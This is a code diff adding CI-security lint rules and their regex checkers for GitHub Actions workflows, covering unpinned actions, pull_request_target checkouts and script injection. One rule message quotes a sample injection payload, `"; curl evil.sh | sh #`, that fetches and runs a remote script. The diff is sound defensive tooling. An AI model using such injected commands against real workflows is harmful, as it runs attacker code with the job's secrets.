@@ -38,6 +38,7 @@ var INJECTION_EXCLUDES = [
   "vendor/**",
   "**/site-packages/**"
 ];
+var WORKFLOW_FILES = [".github/workflows/*.yml", ".github/workflows/*.yaml", "**/.github/workflows/*.yml", "**/.github/workflows/*.yaml"];
 var UI_CODE_FILES = ["*.tsx", "*.jsx", "*.vue", "*.svelte", "*.astro", "*.html", "*.htm"];
 var UI_STYLE_FILES = [...UI_CODE_FILES, "*.css", "*.scss", "*.sass", "*.less"];
 var TELL_EXCLUDES = [...INJECTION_EXCLUDES, "**/stories/**", "stories/**", "**/.storybook/**", "*.story.*"];
@@ -2391,6 +2392,38 @@ var BUILTIN_RULES = [
     severity: "block",
     skill: "security-policy"
   },
+  // CI workflows (ci-policy). Measured over the reference repos' workflow files (guardrails.md, "CI WORKFLOW RULES").
+  {
+    id: "ci-action-unpinned",
+    label: "Third-party actions are pinned to a commit SHA",
+    files: [...WORKFLOW_FILES, "action.yml", "action.yaml"],
+    scope: "file",
+    stage: "diff",
+    fileCheck: "ci-action-unpinned",
+    message: "This step runs a third-party action (or reusable workflow) by a tag or branch, and whoever controls that repository can move the tag to new code after you reviewed it - the tj-actions/changed-files compromise in March 2025 rewrote every tag to dump CI secrets. Pin the full 40-character commit SHA with the version as a comment: `uses: owner/action@<sha> # v4.2.1` (resolve it with `gh api repos/<owner>/<action>/commits/<tag> --jq .sha`), and let Dependabot (`package-ecosystem: github-actions`) or Renovate move the pin. A container image is pinned by `@sha256:` digest. Mark the line `enigma:allow-unpinned-action` for an action this organization owns and releases itself (ci-policy).",
+    severity: "block",
+    skill: "ci-policy"
+  },
+  {
+    id: "ci-untrusted-checkout",
+    label: "Privileged workflows never run a pull request's code",
+    files: WORKFLOW_FILES,
+    scope: "file",
+    fileCheck: "ci-untrusted-checkout",
+    message: "This workflow runs on `pull_request_target` or `workflow_run`, which carry the base repository's secrets and a write token, and it checks out the pull request's own code. Any build, install or test step that follows runs code a fork author wrote, with those secrets (a \"pwn request\"). Run the untrusted code under `pull_request` (no secrets, read-only token) and, if a privileged step is needed, pass it only data through an artifact that the `workflow_run` job reads without executing. Mark the line `enigma:allow-untrusted-checkout` when the checked-out files are only read as data and nothing from them is executed or installed (ci-policy).",
+    severity: "block",
+    skill: "ci-policy"
+  },
+  {
+    id: "ci-script-injection",
+    label: "Untrusted event text never reaches a script directly",
+    files: [...WORKFLOW_FILES, "action.yml", "action.yaml"],
+    scope: "file",
+    fileCheck: "ci-script-injection",
+    message: 'This script interpolates text that anyone who opens an issue or pull request controls (a title, body, comment, branch name or commit message) with `${{ }}`. Actions substitutes it into the script BEFORE the shell or JavaScript runs, so a title like `"; curl evil.sh | sh #` becomes code with the job\'s token and secrets. Pass it through an environment variable and quote it: `env: TITLE: ${{ github.event.issue.title }}` then `"$TITLE"` in the script (or `process.env.TITLE` in github-script) (ci-policy).',
+    severity: "block",
+    skill: "ci-policy"
+  },
   {
     id: "sec-secret-compare-timing",
     label: "Secrets are compared in constant time",
@@ -2713,6 +2746,9 @@ var FILE_CHECKS = {
   "sec-markdown-html-unsanitized": (content) => unsanitizedMarkdownHtml(content),
   "fe-radix-overlay-no-portal": (content) => radixContentWithoutPortal(content),
   "sec-ssh-host-key-unverified": (content) => unverifiedSshHostKey(content),
+  "ci-action-unpinned": (content) => unpinnedWorkflowAction(content),
+  "ci-untrusted-checkout": (content) => untrustedCheckout(content),
+  "ci-script-injection": (content) => untrustedTextInScript(content),
   "sec-secret-compare-timing": (content, file) => timingUnsafeSecretCompare(content, file),
   "sec-redirect-prefix-check": (content, file) => redirectPrefixCheck(content, file),
   "sec-open-redirect-from-input": (content, file) => redirectFromInput(content, file),
@@ -4020,6 +4056,74 @@ function unverifiedSshHostKey(content) {
   }
   return out;
 }
+var ACTION_USES = /^\s*(?:-\s+)?uses:\s*["']?([^\s"'#]+)/;
+var FULL_SHA = /^[0-9a-f]{40}$/i;
+var IMAGE_DIGEST = /@sha256:[0-9a-f]{64}$/i;
+function unpinnedWorkflowAction(content) {
+  const out = [];
+  const lines = content.split("\n");
+  for (let i = 0; i < lines.length; i++) {
+    const text = lines[i];
+    if (auditSkipLine(text)) continue;
+    const ref = ACTION_USES.exec(text)?.[1];
+    if (!ref || ref.startsWith("./") || ref.startsWith("../") || ref.includes("${{")) continue;
+    if (ref.startsWith("docker://")) {
+      if (!IMAGE_DIGEST.test(ref)) out.push({ line: i + 1, detail: ref });
+      continue;
+    }
+    const at = ref.lastIndexOf("@");
+    if (at < 0 || !FULL_SHA.test(ref.slice(at + 1))) out.push({ line: i + 1, detail: ref });
+  }
+  return out;
+}
+var PRIVILEGED_TRIGGER = /\b(?:pull_request_target|workflow_run)\b/;
+var PR_HEAD_REF = /\$\{\{[^}]*\b(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(?:sha|branch))\b|refs\/pull\/(?:\$\{\{[^}]*\}\}|[^\s"'/]+)\/(?:head|merge)\b/;
+var CHECKOUT_SITE = /^\s*(?:-\s+)?ref:|\bgit\s+(?:fetch|checkout|switch|pull|worktree)\b|\bgh\s+pr\s+checkout\b/;
+var SAME_REPO_GUARD = /\b(?:workflow_run\.head_repository|pull_request\.head\.repo)\.(?:full_name|fork)\b/;
+function untrustedCheckout(content) {
+  const lines = content.split("\n");
+  const live = lines.filter((l) => !COMMENT_LINE.test(l));
+  if (!live.some((l) => PRIVILEGED_TRIGGER.test(l)) || live.some((l) => SAME_REPO_GUARD.test(l))) return [];
+  const out = [];
+  for (let i = 0; i < lines.length; i++) {
+    const text = lines[i];
+    if (auditSkipLine(text) || !CHECKOUT_SITE.test(text)) continue;
+    const head = PR_HEAD_REF.exec(text) ?? /\bgh\s+pr\s+checkout\b/.exec(text);
+    if (head) out.push({ line: i + 1, detail: head[0] });
+  }
+  return out;
+}
+var UNTRUSTED_EVENT_TEXT = /\$\{\{[^}]*?\b(github\.head_ref|github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)|github\.event\.(?:comment|review|review_comment)\.body|github\.event\.pages\b[^}]*?\.page_name|github\.event\.head_commit\.(?:message|author\.(?:email|name))|github\.event\.commits\b[^}]*?\.(?:message|author\.(?:email|name))|github\.event\.pull_request\.head\.(?:ref|label|repo\.default_branch)|github\.event\.workflow_run\.(?:head_branch|display_title|head_commit\.message))\b/;
+var SCRIPT_KEY = /^(\s*)(-\s+)?(?:run|script):\s*(.*)$/;
+var BLOCK_SCALAR = /^[|>][-+0-9]*\s*(?:#.*)?$/;
+function untrustedTextInScript(content) {
+  const out = [];
+  const lines = content.split("\n");
+  const check = (text, i) => {
+    if (/enigma:/.test(text)) return;
+    const m = UNTRUSTED_EVENT_TEXT.exec(text);
+    if (m) out.push({ line: i + 1, detail: m[1] });
+  };
+  let bodyAbove = -1;
+  for (let i = 0; i < lines.length; i++) {
+    const text = lines[i];
+    if (bodyAbove >= 0) {
+      if (text.trim() === "") continue;
+      if (text.length - text.trimStart().length > bodyAbove) {
+        check(text, i);
+        continue;
+      }
+      bodyAbove = -1;
+    }
+    if (COMMENT_LINE.test(text)) continue;
+    const key = SCRIPT_KEY.exec(text);
+    if (!key) continue;
+    const rest = key[3];
+    if (BLOCK_SCALAR.test(rest)) bodyAbove = key[1].length + (key[2]?.length ?? 0);
+    else check(rest, i);
+  }
+  return out;
+}
 var OPERAND_BEFORE = /((?:`[^`]*`)|[A-Za-z_$][\w$]*(?:\??\.[A-Za-z_$][\w$]*|\[[^\]\n]{1,60}\]|\((?:[^()\n]|\([^()\n]*\))*\))*)\s*$/;
 var OPERAND_AFTER = /^\s*((?:`[^`]*`)|(?:await\s+)?[A-Za-z_$][\w$]*(?:\??\.[A-Za-z_$][\w$]*|\[[^\]\n]{1,60}\]|\((?:[^()\n]|\([^()\n]*\))*\))*)/;
 var LITERAL_OPERAND = /^(?:null|undefined|true|false|None|True|False|NaN|\d[\w.]*|["'][^"']*["']|`[^`$]*`)$/;
@@ -4847,8 +4951,11 @@ export {
   unboundedFanout,
   unboundedOrmRead,
   unboundedRemoteList,
+  unpinnedWorkflowAction,
   unsafeDeserialization,
   unsanitizedMarkdownHtml,
+  untrustedCheckout,
+  untrustedTextInScript,
   unverifiedSshHostKey,
   viewBlankedWhileLoading,
   wideNamedImports
